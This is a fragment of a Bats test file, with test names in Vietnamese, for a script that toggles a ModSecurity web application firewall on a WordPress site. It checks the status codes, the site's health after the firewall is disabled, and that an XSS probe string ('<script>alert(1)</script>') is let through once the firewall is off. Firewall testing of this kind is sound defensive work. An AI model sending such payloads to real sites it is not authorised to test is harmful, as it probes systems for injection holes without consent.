  assert_passed "$(code_get s "<script>alert(1)</script>")" "XSS sau khi tắt"
}

@test "[Modsecurity Test] Nhóm 8: status trả mã 10 khi đã tắt" {
  run bash "$SCRIPT_MODSEC" status
  [ "$status" -eq 10 ]
  [[ "$output" =~ "OFF" ]]
}

@test "[Modsecurity Test] Nhóm 8: Website vẫn hoạt động bình thường sau toàn bộ chu trình bật/tắt" {
  local code
  code="$(code_path "${WAF_TARGET_PATH:-/}")"
  [ "$code" = "200" ]

  if [[ -f "${WAF_DOCROOT:-/nonexistent}/wp-config.php" ]] && command -v wp >/dev/null 2>&1; then
    run wp core is-installed --path="${WAF_DOCROOT}" --allow-root
    [ "$status" -eq 0 ]
  fi
}
